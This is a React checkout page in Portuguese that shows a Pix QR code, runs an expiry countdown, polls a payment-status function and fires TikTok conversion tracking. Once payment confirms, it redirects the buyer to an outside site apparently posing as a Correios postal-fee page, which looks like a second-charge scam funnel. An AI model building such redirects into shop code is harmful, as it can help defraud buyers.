/**
 * Rota: /pagamento-pix
 * Propósito: Exibe o código "Copia e Cola" e o QR Code do Pix gerados pelo checkout.
 * Inclui lógica de temporizador de expiração e polling (verificação recorrente)
 * do status do pagamento via Supabase Edge Function.
 */

import { useNavigate, useLocation } from "react-router-dom";
import { Copy, Check, Loader2 } from "lucide-react";
import { useState, useEffect, useRef } from "react";
import { QRCodeSVG } from "qrcode.react";
import { useSessionTracker } from "@/hooks/useSessionTracker";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { trackTikTokEvent } from "@/hooks/useTikTokPixel";
import CheckoutHeader from "@/components/CheckoutHeader";
import CheckoutTrustRow from "@/components/CheckoutTrustRow";

/**
 * Componente da página de Pagamento Pix.
 * Gerencia o tempo de expiração e redireciona automaticamente após a confirmação do pagamento.
 */
const PagamentoPix = () => {
  useSessionTracker("/pagamento-pix");

  // Sinaliza que um Pix foi gerado para disparar lógica de retenção se o usuário tentar sair
  useEffect(() => {
    sessionStorage.setItem("pix_generated", "true");
  }, []);

  const navigate = useNavigate();
  const location = useLocation();
  const pixData = location.state as { pixCode?: string; pixQrCode?: string; total?: number; transactionId?: string } | null;
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60);
  const [paymentStatus, setPaymentStatus] = useState<string>("pending");
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Efeito do temporizador regressivo (15 minutos)
  useEffect(() => {
    if (!pixData?.pixCode) {
      navigate("/finalizar-compra");
      return;
    }
    const interval = setInterval(() => {
      setTimeLeft((t) => {
        if (t <= 0) {
          clearInterval(interval);
          return 0;
        }
        return t - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [pixData, navigate]);

  // Efeito de Polling: verifica o status do pagamento a cada 5 segundos
  useEffect(() => {
    if (!pixData?.transactionId || paymentStatus === "paid") return;

    // BUGFIX: usar flag por ref para evitar múltiplas execuções concorrentes
    // e redirects duplicados quando a resposta chega quase simultaneamente.
    let stopped = false;

    const checkPayment = async () => {
      if (stopped) return;
      try {
        const { data, error } = await supabase.functions.invoke("check-payment", {
          body: { transaction_id: pixData.transactionId },
        });

        if (error) {
          // Erro de rede/edge function — não interrompe o polling, apenas loga.
          console.warn("Falha ao consultar pagamento:", error.message);
          return;
        }

        if (data?.error) {
          console.warn("Gateway retornou erro:", data.error);
          return;
        }

        if (data?.status === "paid" && !stopped) {
          stopped = true;
          setPaymentStatus("paid");
          // Conversão confirmada: dispara CompletePayment no TikTok Pixel
          trackTikTokEvent("CompletePayment", {
            content_type: "product",
            content_id: pixData?.transactionId || "product",
            currency: "BRL",
            value: pixData?.total || 0,
          });
          if (pollingRef.current) clearInterval(pollingRef.current);

          // Redireciona para página externa de confirmação/sucesso
          setTimeout(() => {
            window.location.href = "https://correios-ttk-taxa.lovable.app";
          }, 1500);
        }
      } catch (err) {
        console.error("Erro no polling de pagamento:", err);
      }
    };

    checkPayment();
    pollingRef.current = setInterval(checkPayment, 5000);

    return () => {
      stopped = true;
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [pixData?.transactionId, paymentStatus]);

  /**
   * Formata os segundos em MM:SS.
   */
  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  /**
   * Copia o código Pix para a área de transferência com tratamento de erros
   * (ex.: navegador sem suporte ou permissão negada).
   */
  const handleCopy = async () => {
    if (!pixData?.pixCode) return;
    try {
      await navigator.clipboard.writeText(pixData.pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error("Erro ao copiar código PIX:", err);
      toast.error("Não foi possível copiar. Selecione o código manualmente.");
    }
  };

  if (!pixData) return null;

  // Tela de transição exibida quando o pagamento é detectado como pago
  if (paymentStatus === "paid") {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4">
        <div className="rounded-2xl bg-card p-8 border border-border text-center w-full max-w-sm">
          <div className="w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center bg-primary/10">
            <Check className="w-8 h-8 text-primary" />
          </div>
          <h2 className="text-xl font-bold text-foreground mb-2">Pagamento Confirmado!</h2>
          <p className="text-sm text-muted-foreground mb-4">Redirecionando você...</p>
          <Loader2 className="w-5 h-5 animate-spin mx-auto text-muted-foreground" />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <CheckoutHeader onBack={() => navigate("/finalizar-compra")} step="pagamento" />

      <div className="flex-1 w-full max-w-2xl mx-auto px-4 py-6 space-y-4">
        <h1 className="text-xs font-bold uppercase tracking-widest text-muted-foreground">Pagamento PIX</h1>

        <div className="rounded-2xl bg-card w-full p-3 border border-border flex items-center justify-center gap-2">
          <Loader2 className="w-4 h-4 animate-spin text-primary" />
          <p className="text-xs text-muted-foreground">Aguardando pagamento...</p>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="rounded-2xl bg-card w-full p-4 text-center border border-border">
            <p className="text-xs uppercase tracking-widest text-muted-foreground mb-1">Pague em até</p>
            <p className="text-2xl font-bold text-primary">{formatTime(timeLeft)}</p>
          </div>

          <div className="rounded-2xl bg-card w-full p-4 text-center border border-border">
            <p className="text-xs uppercase tracking-widest text-muted-foreground mb-1">Valor total</p>
            <p className="text-2xl font-bold text-foreground">R$ {pixData.total?.toFixed(2).replace(".", ",")}</p>
          </div>
        </div>

        {/* Renderização do QR Code SVG */}
        {pixData.pixCode && (
          <div className="rounded-2xl bg-card p-6 border border-border flex flex-col items-center">
            <p className="text-xs font-bold uppercase tracking-widest text-muted-foreground mb-4">Escaneie o QR Code</p>
            <div className="p-3 bg-card rounded-xl border border-border">
              <QRCodeSVG value={pixData.pixCode} size={208} />
            </div>
          </div>
        )}

        {/* Área para copiar o código "Copia e Cola" */}
        <div className="rounded-2xl bg-card w-full p-4 sm:p-5 border border-border">
          <p className="text-xs font-bold uppercase tracking-widest text-muted-foreground mb-3 text-center">Ou copie o código PIX</p>
          <div className="bg-muted rounded-xl p-3 text-xs text-muted-foreground break-all mb-4 max-h-24 overflow-y-auto">
            {pixData.pixCode}
          </div>
          <button
            onClick={handleCopy}
            className="w-full py-4 rounded-full text-base font-bold bg-ink text-ink-foreground hover:bg-black transition-colors shadow-lg shadow-black/10 flex items-center justify-center gap-2"
          >
            {copied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
            {copied ? "Copiado!" : "Copiar código PIX"}
          </button>
        </div>

        <div className="rounded-2xl bg-muted w-full p-4 sm:p-5">
          <p className="text-xs font-bold uppercase tracking-widest text-muted-foreground mb-3">Como pagar</p>
          <ol className="text-sm text-foreground space-y-2 list-decimal list-inside">
            <li>Abra o app do seu banco</li>
            <li>Escolha pagar via PIX</li>
            <li>Escaneie o QR Code ou cole o código</li>
            <li>Confirme o pagamento</li>
          </ol>
        </div>

        <CheckoutTrustRow />
      </div>
    </div>
  );
};

export default PagamentoPix;
